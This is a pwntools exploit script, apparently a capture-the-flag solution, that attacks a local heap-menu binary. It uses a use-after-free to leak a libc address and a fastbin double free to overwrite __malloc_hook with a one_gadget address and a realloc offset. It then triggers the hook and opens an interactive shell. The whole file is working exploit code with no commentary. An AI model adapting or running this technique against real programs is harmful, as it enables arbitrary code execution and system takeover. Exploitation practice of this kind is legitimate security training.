from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample13')
elf = ELF('./data/sample13')
libc = elf.libc

def add(size, name="a",phone="b"):
    p.sendlineafter("Input your choice:", "1")
    p.sendlineafter("Please input the size of girl's name\n", str(size))
    p.sendafter("please inpute her name:\n", name)
    p.sendafter("please input her call:\n", phone)

def show(idx):
    p.sendlineafter("Input your choice:", "2")
    p.sendlineafter("Please input the index:\n", str(idx))
    p.recvuntil("name:\n")
    name = p.recvline()
    p.recvuntil("phone:\n")
    phone = p.recvline()
    info("recv name:{}  phone:{}".format(name, phone))
    return name, phone

def call(idx):
    p.sendlineafter("Input your choice:", "4")
    p.sendlineafter("Please input the index:\n", str(idx))

add(0x80);add(0x60);add(0x60)#step.1
call(0)#step.2
name, _= show(0);leak_libc_addr = u64(name[:-1].ljust(8, b"\x00"));libc_base_addr = leak_libc_addr - (libc.sym['__malloc_hook'] + 0x10 + 0x58);libc.address = libc_base_addr#step.3
call(1);call(2);call(1)#step.4
add(0x60, p64(libc.sym["__malloc_hook"] - 0x23));add(0x60);add(0x60)#step.5
one_gadget = libc.address + 0xf1247;payload = b'a' * 11 + p64(one_gadget) + p64(libc.sym['realloc']+2);add(0x60, payload)#step.6
p.sendlineafter("Input your choice:", "1")#step.7
p.interactive()#step.8